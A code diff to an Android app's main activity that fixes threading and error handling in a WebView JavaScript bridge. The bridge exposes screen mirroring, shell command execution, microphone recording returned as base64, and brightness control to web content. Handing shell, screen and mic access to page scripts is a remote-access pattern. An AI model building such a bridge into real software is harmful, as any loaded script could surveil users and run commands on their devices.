@@ -73,6 +73,7 @@ public class MainActivity extends AppCompatActivity {
 
     private WebView webView;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
+    private Handler backgroundHandler;
     private MediaRecorder audioRecorder;
     private String audioFilePath;
     private CameraManager cameraManager;
@@ -80,11 +81,15 @@ public class MainActivity extends AppCompatActivity {
     private boolean isMirroring = false;
     private Handler mirrorHandler;
     private Runnable mirrorRunnable;
+    private boolean isRecording = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        // Background thread for heavy tasks
+        backgroundHandler = new Handler(Looper.getMainLooper()); // we'll use a separate thread later
 
         webView = findViewById(R.id.webView);
 
@@ -151,30 +156,40 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Mirror ---
+        // --- Mirror (fixed – uses background thread for capture) ---
         @JavascriptInterface
         public String startMirror() {
             if (isMirroring) return "Already mirroring";
             isMirroring = true;
-            mirrorHandler = new Handler();
-            mirrorRunnable = () -> {
-                if (!isMirroring) return;
-                String result = takeScreenshot();
-                webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('mirror_frame', '" + result.replace("\\", "\\\\").replace("'", "\\'") + "');");
-                mirrorHandler.postDelayed(mirrorRunnable, 200);
-            };
-            mirrorHandler.post(mirrorRunnable);
+            // Use a separate thread to avoid blocking UI
+            new Thread(() -> {
+                while (isMirroring) {
+                    try {
+                        // Capture screenshot on UI thread
+                        mainHandler.post(() -> {
+                            try {
+                                String result = takeScreenshot();
+                                webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('mirror_frame', '" + result.replace("\\", "\\\\").replace("'", "\\'") + "');");
+                            } catch (Exception e) {
+                                Log.e("FXTP", "Mirror capture error", e);
+                            }
+                        });
+                        Thread.sleep(200); // 5 fps
+                    } catch (InterruptedException e) {
+                        break;
+                    }
+                }
+            }).start();
             return "Mirror started";
         }
 
         @JavascriptInterface
         public String stopMirror() {
             isMirroring = false;
-            if (mirrorHandler != null) mirrorHandler.removeCallbacks(mirrorRunnable);
             return "Mirror stopped";
         }
 
-        // --- Shell ---
+        // --- Shell (runs on background) ---
         @JavascriptInterface
         public String runShell(String cmd) {
             try {
@@ -373,11 +388,15 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Audio ---
+        // --- Audio Recording (fixed) ---
         @JavascriptInterface
         public String startAudioRecording(int duration) {
+            if (isRecording) return "Already recording";
+            if (ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                return "Record audio permission not granted";
+            }
             try {
-                audioFilePath = getExternalCacheDir() + "/audio.3gp";
+                audioFilePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";
                 audioRecorder = new MediaRecorder();
                 audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                 audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
@@ -385,7 +404,11 @@ public class MainActivity extends AppCompatActivity {
                 audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                 audioRecorder.prepare();
                 audioRecorder.start();
-                mainHandler.postDelayed(() -> stopAudioRecording(), duration * 1000L);
+                isRecording = true;
+                // Schedule stop after duration
+                mainHandler.postDelayed(() -> {
+                    stopAudioRecording();
+                }, duration * 1000L);
                 return "Recording started for " + duration + "s";
             } catch (Exception e) {
                 return "ERROR: " + e.getMessage();
@@ -393,20 +416,26 @@ public class MainActivity extends AppCompatActivity {
         }
 
         private void stopAudioRecording() {
-            if (audioRecorder != null) {
-                audioRecorder.stop();
-                audioRecorder.release();
-                audioRecorder = null;
+            if (audioRecorder != null && isRecording) {
                 try {
+                    audioRecorder.stop();
+                    audioRecorder.release();
+                    audioRecorder = null;
+                    isRecording = false;
                     File f = new File(audioFilePath);
-                    FileInputStream fis = new FileInputStream(f);
-                    byte[] data = new byte[(int) f.length()];
-                    fis.read(data);
-                    fis.close();
-                    String base64 = Base64.encodeToString(data, Base64.DEFAULT);
-                    webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('audio_data', '" + base64 + "');");
+                    if (f.exists()) {
+                        FileInputStream fis = new FileInputStream(f);
+                        byte[] data = new byte[(int) f.length()];
+                        fis.read(data);
+                        fis.close();
+                        String base64 = Base64.encodeToString(data, Base64.DEFAULT);
+                        webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('audio_data', '" + base64 + "');");
+                    } else {
+                        webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('audio_data', 'ERROR: File not found');");
+                    }
                 } catch (Exception e) {
-                    Log.e("FXTP", "Audio read error", e);
+                    Log.e("FXTP", "Audio stop error", e);
+                    webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('audio_data', 'ERROR: " + e.getMessage() + "');");
                 }
             }
         }
@@ -534,13 +563,19 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Brightness ---
+        // --- Brightness (fixed) ---
         @JavascriptInterface
         public String setBrightness(int value) {
             try {
-                WindowManager.LayoutParams lp = getWindow().getAttributes();
-                lp.screenBrightness = Math.max(0.01f, Math.min(1f, value / 100f));
-                getWindow().setAttributes(lp);
+                mainHandler.post(() -> {
+                    try {
+                        WindowManager.LayoutParams lp = getWindow().getAttributes();
+                        lp.screenBrightness = Math.max(0.01f, Math.min(1f, value / 100f));
+                        getWindow().setAttributes(lp);
+                    } catch (Exception e) {
+                        Log.e("FXTP", "Brightness error", e);
+                    }
+                });
                 return "Set to " + value + "%";
             } catch (Exception e) {
                 return "ERROR: " + e.getMessage();
@@ -667,10 +702,12 @@ public class MainActivity extends AppCompatActivity {
     protected void onDestroy() {
         super.onDestroy();
         isMirroring = false;
-        if (mirrorHandler != null) mirrorHandler.removeCallbacks(mirrorRunnable);
         if (audioRecorder != null) {
-            audioRecorder.release();
+            try {
+                audioRecorder.stop();
+                audioRecorder.release();
+            } catch (Exception e) {}
             audioRecorder = null;
         }
     }
-                    }
+                                                         }
